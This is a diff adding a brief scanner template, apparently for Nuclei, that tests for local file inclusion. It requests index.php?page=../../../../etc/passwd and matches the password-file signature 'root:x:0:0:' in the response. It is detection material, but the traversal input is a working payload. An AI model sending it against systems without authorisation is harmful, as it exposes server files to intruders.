@@ -1,0 +1,14 @@
+id: lfi-basic
+info:
+  name: Basic Local File Inclusion
+  severity: high
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?page=../../../../etc/passwd"
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:"
+        part: body
